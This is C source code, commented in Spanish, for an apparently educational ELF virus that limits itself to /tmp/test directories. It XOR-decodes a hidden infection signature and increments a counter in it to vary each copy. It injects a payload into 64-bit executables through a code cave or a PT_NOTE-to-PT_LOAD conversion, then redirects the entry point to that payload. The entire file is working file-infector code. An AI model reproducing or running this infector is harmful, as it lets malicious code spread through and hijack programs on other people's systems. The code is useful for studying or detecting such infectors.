#define _GNU_SOURCE

#include "../incl/war.h"
#include "payload.h"

static unsigned char g_signature[] = {
    0x15, 0x23, 0x30, 0x62, 0x34, 0x27, 0x30, 0x31,
    0x2b, 0x2d, 0x2c, 0x62, 0x73, 0x6c, 0x72, 0x62,
    0x6a, 0x21, 0x6b, 0x2d, 0x26, 0x27, 0x26, 0x62,
    0x0d, 0x21, 0x36, 0x62, 0x6f, 0x62, 0x70, 0x72,
    0x70, 0x74, 0x62, 0x20, 0x3b, 0x62, 0x26, 0x23,
    0x34, 0x25, 0x23, 0x2e, 0x2e, 0x27, 0x62, 0x6f,
    0x62, 0x00
};

void    ft_obfuscation(t_war *war)
{
    int i = 0;
    while (g_signature[i])
    {
        war->decrypted[i] = g_signature[i] ^ KEY;
        i++;
    }
    war->decrypted[i] = '\0';
}

void    ft_update_payload(t_war *war, char *str, int count)
{
    off_t   offset;
    int     fd;

    offset = (unsigned char *)war->signd - war->elf;
    offset += count;
    
    fd = open(war->binary, O_RDWR);
    if (fd == -1)
        return;
    if (lseek(fd, offset, SEEK_SET) == -1)
    {
        close(fd);
        return;
    }
    write(fd, str, strlen(str));
    close(fd);
    return;
}

void    ft_polymorphism(t_war *war)
{
    char    *buffer;
    char    *aux = war->signd;
    int     value = 0;
    int     start = ft_strlen(war->decrypted);
    int     offset = start;
    int     len = ft_couter(war->signd, start) + 1;

    buffer = malloc(len);
    if (!buffer)
        return;
    while (aux[offset] != '\0')
    {
        buffer[value] = aux[offset];
        value++;
        offset++;
    }
    buffer[value] = '\0';
    value = 0;
    value = atoi(buffer);
    value++;
    snprintf(buffer, len, "%05d", value);
    ft_update_payload(war, buffer, start);
    free(buffer);
}

char    *ft_getdir(int i)
{
    if (i == 0)
        return ("/tmp/test");
    return ("/tmp/test2");
}

int     ft_is_infection(t_war *war)
{
    ft_obfuscation(war);
    war->signd = memmem(war->elf, war->file_size, war->decrypted, strlen(war->decrypted));
    if (war->signd)
    {
        ft_polymorphism(war);
        return (1);
    }
    return (0);
}

void    ft_infect(t_war *war)
{
    pid_t           pid;
    unsigned char   *payload;
    char            *full_signature;
    uint64_t        new_vaddr;
    Elf64_Phdr      *phdr;
    Elf64_Addr      new_entry;
    off_t           insertion_point;
    off_t           aligned_insertion;
    Elf64_Half      e_phnum_save = 0;
    Elf64_Phdr      *phdr_table_copy = NULL;
    size_t          sig_len;
    int             i = 0;
    int             note_index = -1;
    int             load_index = -1;
    off_t           gap_start = 0;
    int             use_gap = 0;

    // 1. Reservar y cargar el binario plano del payload
    payload = malloc(src_payload_bin_len);
    if (!payload)
        return;
    memcpy(payload, src_payload_bin, src_payload_bin_len);

    // 2. Obtener la tabla de Program Headers
    phdr = (Elf64_Phdr *)(war->elf + war->header->e_phoff);

    // 3. Preparar la firma (con el fingerprint)
    pid = getpid();
    if (pid < 0)
    {
        free(payload);
        return;
    }
    full_signature = malloc(strlen(war->decrypted) + 16);
    if (!full_signature)
    {
        free(payload);
        return;
    }
    snprintf(full_signature, strlen(war->decrypted) + 16, "%s%d", war->decrypted, (int)pid);
    sig_len = strlen(full_signature);

    // 4. Buscar un hueco entre PT_LOADs ejecutables (primera opción)
    for (i = 0; i < war->header->e_phnum; i++)
    {
        if (phdr[i].p_type != PT_LOAD)
            continue;
        if (!(phdr[i].p_flags & PF_X))
            continue;

        off_t end = phdr[i].p_offset + phdr[i].p_filesz;
        off_t next_start = war->file_size;
        for (int j = i + 1; j < war->header->e_phnum; j++)
        {
            if (phdr[j].p_type == PT_LOAD && phdr[j].p_offset > phdr[i].p_offset)
            {
                next_start = phdr[j].p_offset;
                break;
            }
        }
        off_t gap = next_start - end;
        if (gap >= (off_t)(src_payload_bin_len + sig_len))
        {
            load_index = i;
            gap_start = end;
            use_gap = 1;
            break;
        }
    }

    // 5. Si hay hueco, inyectar ahí; si no, buscar PT_NOTE
    if (use_gap)
    {
        // Inyectar en el hueco
        new_vaddr = phdr[load_index].p_vaddr + (gap_start - phdr[load_index].p_offset);
        new_entry = new_vaddr;

        // Parchear el PT_LOAD
        phdr[load_index].p_filesz += src_payload_bin_len + sig_len;
        phdr[load_index].p_memsz  += src_payload_bin_len + sig_len;

        // Parchear el payload
        uint64_t entry_delta = war->header->e_entry - new_vaddr;
        memcpy(payload + 2, &entry_delta, sizeof(uint64_t));
        uint64_t sig_off = gap_start + src_payload_bin_len;
        memcpy(payload + 10, &sig_off, sizeof(uint64_t));
        // Flag: use_gap = 1 (hueco)
        uint64_t gap_flag = 1;
        memcpy(payload + 18, &gap_flag, sizeof(uint64_t));

        // Redirigir e_entry
        war->header->e_entry = new_entry;
        insertion_point = gap_start;
        aligned_insertion = gap_start;
    }
    else
    {
        // Fallback: PT_NOTE + final del archivo
        for (i = 0; i < war->header->e_phnum; i++)
        {
            if (phdr[i].p_type == PT_NOTE && note_index == -1)
            {
                note_index = i;
                break;
            }
        }
        if (note_index == -1)
        {
            munmap(war->elf, war->file_size);
            close(war->fd);
            free(payload);
            free(full_signature);
            return;
        }

        insertion_point = war->file_size;
        aligned_insertion = (insertion_point + 0xfff) & ~0xfff;

        uint64_t max_vaddr = 0;
        for (int j = 0; j < war->header->e_phnum; j++)
        {
            if (phdr[j].p_type == PT_LOAD)
            {
                uint64_t end_vaddr = phdr[j].p_vaddr + phdr[j].p_memsz;
                if (end_vaddr > max_vaddr)
                    max_vaddr = end_vaddr;
            }
        }
        new_vaddr = (max_vaddr + 0xfff) & ~0xfff;
        new_entry = new_vaddr;

        // Parchear el PT_NOTE
        phdr[note_index].p_type = PT_LOAD;
        phdr[note_index].p_flags = PF_R | PF_X;
        phdr[note_index].p_offset = aligned_insertion;
        phdr[note_index].p_vaddr = new_vaddr;
        phdr[note_index].p_paddr = new_vaddr;
        phdr[note_index].p_filesz = src_payload_bin_len + sig_len;
        phdr[note_index].p_memsz = phdr[note_index].p_filesz;
        phdr[note_index].p_align = 0x1000;

        // Parchear el payload
        uint64_t entry_delta = war->header->e_entry - new_vaddr;
        memcpy(payload + 2, &entry_delta, sizeof(uint64_t));
        uint64_t sig_off = aligned_insertion + src_payload_bin_len;
        memcpy(payload + 10, &sig_off, sizeof(uint64_t));
        // Flag: use_gap = 0 (PT_NOTE)
        uint64_t gap_flag = 0;
        memcpy(payload + 18, &gap_flag, sizeof(uint64_t));

        // Redirigir e_entry
        war->header->e_entry = new_entry;
    }

    e_phnum_save = war->header->e_phnum;

    // 6. Copiar program headers modificados
    phdr_table_copy = malloc(e_phnum_save * sizeof(Elf64_Phdr));
    if (phdr_table_copy)
        memcpy(phdr_table_copy, phdr, e_phnum_save * sizeof(Elf64_Phdr));

    // 7. Desmontar el mapeo antiguo y reabrir descriptor en escritura
    munmap(war->elf, war->file_size);
    close(war->fd);

    war->fd = open(war->binary, O_RDWR | O_NOFOLLOW);
    if (war->fd == -1)
    {
        free(full_signature);
        free(payload);
        free(phdr_table_copy);
        return;
    }

    // 8. Escribir nuevo e_entry (offset 24)
    lseek(war->fd, 24, SEEK_SET);
    write(war->fd, &new_entry, sizeof(Elf64_Addr));

    // 9. Reescribir tabla de Program Headers (offset 64)
    if (phdr_table_copy)
    {
        lseek(war->fd, 64, SEEK_SET);
        write(war->fd, phdr_table_copy, e_phnum_save * sizeof(Elf64_Phdr));
    }

    // 10. Rellenar con ceros (padding) hasta aligned_insertion (si es PT_NOTE)
    if (!use_gap && aligned_insertion > insertion_point)
    {
        size_t pad_len = aligned_insertion - insertion_point;
        char *pad = calloc(1, pad_len);
        if (pad)
        {
            lseek(war->fd, insertion_point, SEEK_SET);
            write(war->fd, pad, pad_len);
            free(pad);
        }
    }

    // 11. Escribir payload
    lseek(war->fd, aligned_insertion, SEEK_SET);
    write(war->fd, payload, src_payload_bin_len);

    // 12. Escribir la firma
    write(war->fd, full_signature, sig_len);

    // 13. Limpieza
    close(war->fd);
    free(full_signature);
    free(payload);
    free(phdr_table_copy);
}
